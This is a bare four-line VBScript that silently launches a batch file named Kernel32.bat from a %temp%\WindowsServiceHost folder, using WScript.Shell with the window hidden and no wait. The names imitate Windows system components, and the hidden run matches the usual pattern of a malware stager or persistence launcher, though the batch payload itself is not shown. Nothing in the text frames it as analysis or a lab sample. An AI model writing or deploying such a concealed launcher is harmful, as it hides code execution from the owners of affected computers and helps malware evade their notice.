Dim batFilePath, objShell
batFilePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%\WindowsServiceHost\Kernel32.bat")
Set objShell = CreateObject("WScript.Shell")
objShell.Run """" & batFilePath & """", 0, False
